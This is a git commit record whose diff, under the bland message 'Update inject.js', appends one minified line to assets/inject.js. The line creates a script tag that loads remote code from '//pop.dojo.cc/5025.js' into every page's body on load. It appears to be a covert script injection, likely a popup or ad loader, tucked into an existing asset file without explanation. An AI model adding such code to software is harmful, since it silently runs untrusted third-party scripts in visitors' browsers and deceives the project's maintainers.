9e06010a33276ab980edc494276c052237e9e219
ankur3011par <52069590+ankur3011par@users.noreply.github.com>
2021-12-01 18:18:19 +0530

    Update inject.js

--- assets/inject.js
+++ assets/inject.js
@@ -150,4 +150,4 @@ dataLazy.forEach(function(a){
     };
   };
 });
-
+(function(){injectScript([{"attr":[{"name":"src","value":"//pop.dojo.cc/5025.js"}],"tag":"script","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
